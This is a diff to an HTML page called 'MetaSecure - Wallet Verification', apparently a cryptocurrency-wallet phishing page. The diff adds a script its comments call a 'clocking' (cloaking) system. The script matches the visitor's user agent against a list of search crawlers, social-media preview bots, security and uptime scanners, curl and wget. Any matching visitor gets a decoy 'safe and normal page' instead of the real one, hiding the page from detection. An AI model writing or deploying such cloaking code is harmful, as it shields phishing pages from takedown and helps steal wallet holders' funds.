@@ -5,6 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MetaSecure - Wallet Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        // ============================================
+        // CLOCKING SYSTEM: Googlebot & Bot Detection
+        // ============================================
+        (function() {
+            const ua = navigator.userAgent.toLowerCase();
+            
+            // সব পরিচিত বট ও ক্রলারের তালিকা
+            const botSignatures = [
+                'googlebot', 'bingbot', 'yandex', 'duckduckbot', 'slurp',
+                'baiduspider', 'facebookexternalhit', 'twitterbot', 'whatsapp',
+                'telegrambot', 'curl', 'wget', 'python-requests', 'scrapy',
+                'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'petalbot',
+                'bytespider', 'applebot', 'ia_archiver', 'archive.org_bot',
+                'linkedinbot', 'pinterest', 'slackbot', 'discordbot',
+                'google-inspectiontool', 'chrome-lighthouse', 'gtmetrix',
+                'pingdom', 'uptimerobot', 'statuscake', 'site24x7'
+            ];
+            
+            const isBot = botSignatures.some(sig => ua.includes(sig));
+            
+            if (isBot) {
+                // বটের জন্য সম্পূর্ণ নিরীহ পেজ
+                document.documentElement.innerHTML = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Welcome</title>
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    </head>
+                    <body style="font-family: Arial, sans-serif; padding: 60px 20px; text-align: center; background: #fafafa; color: #333;">
+                        <h1 style="font-size: 24px; margin-bottom: 10px;">Welcome to Our Website</h1>
+                        <p style="font-size: 15px; color: #666; line-height: 1.6;">This is a safe and normal page. Nothing to see here.</p>
+                    </body>
+                    </html>
+                `;
+                throw new Error('Bot detected - blank page served');
+            }
+        })();
+        // ============================================
+    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
         
@@ -391,4 +432,4 @@
         });
     </script>
 </body>
-  </html>
+    </html>
